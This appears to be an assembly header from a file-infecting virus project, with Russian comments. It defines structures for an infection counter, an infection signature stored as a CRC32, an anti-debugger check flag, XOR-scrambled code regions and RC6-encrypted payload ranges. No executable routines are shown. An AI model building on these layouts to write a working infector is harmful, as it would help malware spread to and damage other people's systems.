struct options_t
	copy_start						uint64_t ?; Адрес, с которого копируем
	copy_size						uint64_t ?; Размер копируемого
	arg_list						uint64_t ?; Указатель на на чало аргументов и переменных сред
	adress_debug					uint64_t ?; Указатель на переменную нужно ли проверать на отладчик
	rc6_init						uint64_t ?; Указатель на функцию rc6_init
	size_rb							uint32_t ?; Дополнительный размер
	offset_xor_date_code			uint32_t ?; таблица XOR подготовленных
	offset_xor						uint32_t ?; Смещение на начало XOR
	offset_xor_end					uint32_t ?; Размер перемешанной (XOR) памяти
	offset_time_stamp				uint32_t ?; Смещение на time_stamp
	offset_start					uint32_t ?; Смещение на начало кода - где он начинает работать
	offset_jmp						uint32_t ?; Смещение на переменную с прыжком: место куда нужно прыгнуть или ноль если не нужно
	offset_msg_add					uint32_t ?; Смещение на уникальный номер
	offset_msg_add_count			uint32_t ?; Смещение на счетчик 4 байтный
	offset_msg_add_constant			uint32_t ?; Смещение на постоянное значение в подписи при заражении в виде CRC32
	offset_rc6_start				uint32_t ?; Смещение на указатель начала шифрования
	rc6_size						uint32_t ?; Размер сколько зашифровать
	align options_t.__alignment
ends


struct count_inject_t
	crc32_summ						uint32_t ?;crc32
	crc32_add						uint32_t ?;Случайное число
	count_infection					uint64_t ?; Счетчик заряжений
	align count_inject_t.__alignment
ends


SIZE_XOR_CODE				:= 0x30
SIZE_XOR_CODE_AND			:= 0x3

KEY_LEN		:= 0x10

TIME_STAP_FULL_LEN := 0x20

RC6_W := (0x20)